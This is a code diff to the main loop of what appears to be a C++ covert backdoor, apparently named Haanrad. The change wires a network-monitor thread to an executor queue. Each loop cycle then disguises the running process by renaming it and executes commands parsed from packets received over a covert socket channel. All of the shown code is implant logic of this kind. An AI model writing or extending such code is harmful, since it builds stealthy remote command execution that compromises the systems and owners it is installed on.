@@ -14,6 +14,8 @@
 #include "covertsocket/CovertSocketQueue.h"
 #include "covertsocket/CovertSocketThread.h"
 #include "networkmonitor/NetworkMonitorThread.h"
+#include "executor/Executor.h"
+#include "executor/ExecutorQueue.h"
 
 void * networkMonitorThreadBootstrapper(void * networkMonitorThread){
     NetworkMonitorThread * nmt = (NetworkMonitorThread *)networkMonitorThread;
@@ -138,20 +140,55 @@ int main(int argc, char * argv[]) {
     //create pthread for NetworkMonitor
     //create pthread for CovertSocket
     //create pthread for FileSystemManager ?
-    //create pthread for ProcessDistorter
 
     SystemState::currentState = SystemState::MEDIUM;
 
+    ExecutorQueue * executorQueue = new ExecutorQueue();
+
     Logger::debug("Main - Creating NetworkMonitoring Thread. Starting...");
-    NetworkMonitorThread * networkMonitorThread = new NetworkMonitorThread(networkMonitor);
+    NetworkMonitorThread * networkMonitorThread = new NetworkMonitorThread(networkMonitor, executorQueue);
     pthread_t nmt;
     pthread_create(&nmt, NULL, &networkMonitorThreadBootstrapper, networkMonitorThread);
 
     Logger::debug("Main - NetworkMonitorThread Launched");
 
+
+    //use this thread to cycle through:
+    // 1) ProcessDistorter
+    // 2) SystemState Evaluations
+    // 3) Executing A Command With Executor
+
     while(1){
+        //hang on timer tick
+
+        //rename process
+        processDistorter->determineProcessName();
+
+        //hang on timer tick
+
+        //re-evaluated system state
+
+        //hang on timer tick
+
+        //execute a command
+        string haanradPacket = executorQueue->getExecutionTask();
+        if(haanradPacket.compare("") ==0){
+            Logger::debug("Main - Packet Is Empty. Thus ExecutorQueue Is Assumed Empty");
+        }else{
+            Message message = Executor::formatCommand(haanradPacket);
+            if(message.interMessageCode == InterClientMessageType::ERROR){
+                Logger::debug("Main - There Was An Error Parsing The Haanrad Packet. Can't Execute");
+            }else{
+                string response = Executor::execute(message);
+
+
+
+            }
+        }
 
     }
+
+    //pthread_join(nmt, NULL);
 
 
     //CovertSocketQueue * covertSocketQueue = new CovertSocketQueue();
